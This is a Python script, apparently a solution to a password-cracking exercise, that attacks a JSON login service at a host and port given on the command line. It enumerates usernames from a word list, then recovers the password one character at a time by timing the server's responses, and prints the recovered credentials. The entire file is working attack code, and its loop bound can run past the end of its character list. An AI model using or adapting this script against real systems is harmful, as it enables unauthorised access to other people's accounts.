import sys
import socket
import json
import string
from datetime import datetime




def connect():
    IP, port = sys.argv[1:]
    sox = socket.socket()
    sox.connect((IP, int(port)))
    chars = string.digits + string.ascii_letters

    with open("logins.txt") as logins:
        for word in logins:
            word = word[:-1]
            sox.send(json.dumps({"login": word, "password": " "}).encode())
            response = json.loads(sox.recv(1024).decode())
            if response["result"] == "Wrong password!":
                login = word
                password = ""
                i = 0
                while i <= len(chars):
                    sox.send(json.dumps({"login": login, "password": password + chars[i]}).encode())
                    start = datetime.now()
                    response = json.loads(sox.recv(1024).decode())
                    end = datetime.now()
                    elapsed = end - start
                    if response["result"] == "Wrong password!" and elapsed.microseconds >= 100000:
                        password += chars[i]
                        i = 0
                    elif response["result"] == "Connection success!":
                        password += chars[i]
                        result = json.dumps({"login": login, "password": password})
                        return result
                    else:
                        i += 1


                result = json.dumps({"login": login, "password": password})
                return result
print(connect())